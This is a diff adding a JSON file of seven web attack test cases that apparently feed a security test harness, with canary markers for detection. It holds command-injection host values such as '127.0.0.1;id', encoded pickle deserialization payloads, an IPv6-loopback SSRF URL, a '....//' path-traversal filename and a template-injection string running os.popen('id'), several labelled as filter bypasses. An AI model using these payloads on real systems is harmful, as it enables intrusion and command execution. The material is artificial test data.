@@ -1,0 +1,72 @@
+[
+  {
+    "id": "dyn_deser_1",
+    "endpoint": "/load",
+    "method": "POST",
+    "params": {
+      "data": "gASVJQAAAAAAAIwLc3lzLm1vZHVsZXOUjAZzeXN0ZW2UjAZleGVjdXRlhZRSlC4="
+    },
+    "detect_pattern": "CANARY_DESER_9a1f7b",
+    "technique": "pickle opcode manipulation with base64 encoding to bypass deserialization block"
+  },
+  {
+    "id": "dyn_deser_2",
+    "endpoint": "/load",
+    "method": "POST",
+    "params": {
+      "data": "gASVKAAAAAAAAIwGcG9zdHOUjAZzeXN0ZW2UjAZleGVjdXRlhZRSlC4="
+    },
+    "detect_pattern": "CANARY_DESER_9a1f7b",
+    "technique": "alternative pickle gadget chain using posix module"
+  },
+  {
+    "id": "dyn_cmd_2",
+    "endpoint": "/ping",
+    "method": "POST",
+    "params": {
+      "host": "127.0.0.1;id"
+    },
+    "detect_pattern": "uid=[0-9]+\\(",
+    "technique": "semicolon command separator (not in block_patterns)"
+  },
+  {
+    "id": "dyn_cmd_3",
+    "endpoint": "/ping",
+    "method": "POST",
+    "params": {
+      "host": "127.0.0.1\u0000id"
+    },
+    "detect_pattern": "uid=[0-9]+\\(",
+    "technique": "null byte injection to truncate ping command"
+  },
+  {
+    "id": "dyn_ssrf_2",
+    "endpoint": "/fetch",
+    "method": "GET",
+    "params": {
+      "url": "http://[::1]:8080/healthz"
+    },
+    "detect_pattern": "CANARY_SSRF_3e7d2c",
+    "technique": "IPv6 loopback bypass for host allowlist"
+  },
+  {
+    "id": "dyn_path_2",
+    "endpoint": "/read",
+    "method": "GET",
+    "params": {
+      "name": "....//....//tmp//path_canary.txt"
+    },
+    "detect_pattern": "CANARY_PATH_5c9e0a",
+    "technique": "double-dot bypass with slashes to evade .. substring check"
+  },
+  {
+    "id": "dyn_ssti_2",
+    "endpoint": "/render",
+    "method": "POST",
+    "params": {
+      "template": "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}"
+    },
+    "detect_pattern": "CANARY_SSTI_2b6d4e",
+    "technique": "sandbox escape via config object chain (alternative to underscore-prefixed attrs)"
+  }
+]
